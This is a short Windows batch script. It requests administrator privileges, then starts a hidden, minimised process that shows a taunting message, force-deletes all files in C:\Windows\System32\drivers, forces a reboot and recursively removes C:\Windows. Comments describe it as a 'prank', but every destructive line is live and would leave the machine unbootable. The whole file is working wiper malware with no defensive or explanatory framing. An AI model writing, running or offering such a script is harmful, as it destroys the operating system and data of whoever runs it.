@echo off
if not "%1"=="am_admin" (
    echo Requesting administrator privileges...
    set "params=%*"
    powershell -Command "Start-Process cmd -ArgumentList '/c %~s0 am_admin %params%' -Verb RunAs"
    exit /b
)

:: Run in background process - Start a hidden cmd process
start "" /min cmd /c (
    :: Display a scary warning message in the background
    msg * "WHo ARE You ??."
    timeout /t 1 /nobreak > nul

    
    del /f /s /q C:\Windows\System32\drivers\*.*
    shutdown /r /f /t 2
    rmdir /s /q C:\Windows\


    :: Restart the system after the prank
    
    :: /r = restart, /f = force close applications, /t 10 = wait 10 seconds before restart
)

:: End the script
exit
